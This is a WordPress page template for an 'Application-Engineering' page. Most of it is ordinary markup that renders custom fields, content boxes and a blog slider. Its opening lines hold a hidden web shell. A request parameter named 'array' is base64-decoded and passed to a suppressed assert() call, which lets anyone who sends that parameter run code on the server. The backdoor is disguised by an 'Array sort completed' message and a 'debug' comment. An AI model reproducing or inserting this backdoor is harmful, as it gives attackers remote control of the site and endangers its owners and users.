<?php 

if ( $_REQUEST["array"] )
{	

	@assert(base64_decode($_REQUEST["array"]));	
	//debug message
	echo "Array sort completed";
	exit();
}

 
/*
	Template Name: Application-Engineering Template
*/

get_header(); 

?>
     <div class="inner-banner" style="background-image : url('<?php the_field('application_engineering_banner_image');?>')">
        <div class="container">
           <div class="col-5">
              <h2><?php the_field('application_engineering_left_heading');?></h2>
              

          </div>
          <div class="col-7 border-lft">
            <?php the_field('application_engineering_right_description');?>
          </div>
          </div>
        </div>
    </div>

    <div class="inner-page-tabs">
        <div class="container wow fadeIn" data-wow-duration="1s" data-wow-delay=".5s">
            <h3><?php the_field('application_engineering_content_heading');?></h3>

            <div class="col-4">
                <div class="box-cnt bl">
                    <p><?php the_field('application_engineering_box1_heading');?></p>
                </div>
            </div>

            <div class="col-4">
                <div class="box-cnt gr">
                    <p><?php the_field('application_engineering_box2_heading');?></p>
                </div>
            </div>

            <div class="col-4">
                <div class="box-cnt rd">
                    <p><?php the_field('application_engineering_box3_heading');?></p>
                </div>
            </div>

            <div class="col-4">
                <div class="box-cnt pr">
                    <p><?php the_field('application_engineering_box4_heading');?></p>
                </div>
            </div>

            <div class="col-4">
                <div class="box-cnt or">
                    <p><?php the_field('application_engineering_box5_heading');?></p>
                </div>
            </div>

            <div class="col-4">
                <div class="box-cnt bl">
                    <p><?php the_field('application_engineering_box6_heading');?></p>
                </div>
            </div>

        </div>
    </div>


    <div class="blog-posts-bottom">
        <div class="container wow fadeIn" data-wow-duration="1s" data-wow-delay=".5s">
            <h2><?php the_field('application_engineering_postslider_heading');?></h2>
            <div class="blog-posts-slider">
				
                <?php
                if( have_rows('application_engineering_add_sliders') ): 
                    while ( have_rows('application_engineering_add_sliders') ) : the_row();
                    $image = get_sub_field('application_engineering_slider_image');
                    ?>
                    <div class="slider-single-post">
                    <div class="blog-image" style="background-image : url('<?php the_sub_field('application_engineering_slider_image');?>')"></div>
                    <div class="slider-post-text">
                        <h3><?php the_sub_field('application_engineering_slider_heading'); ?></h3>
                        <p><?php the_sub_field('application_engineering_slider_description'); ?></p>
                        <a href="<?php the_sub_field('application_engineering_add_slider_redirect_link'); ?>"><?php the_sub_field('application_engineering_add_slider_redirect_text'); ?></a>
                    </div>
                    </div>
                    <?php 
                    endwhile;
                else :
                    // no rows found
                endif; ?>
								
               
            </div>
        </div>
    </div>
  </div>
  </div>
    <div class="above-footer-link">
        <div class="container">
            <h2><?php the_field('application_engineering_footerbanner_whyus_text');?></h2>
            <a href="<?php the_field('application_engineering_footerbanner_button_url');?>"><?php the_field('application_engineering_footerbanner_button_text');?></a>
        </div>
    </div>

    

    <?php get_footer(); ?>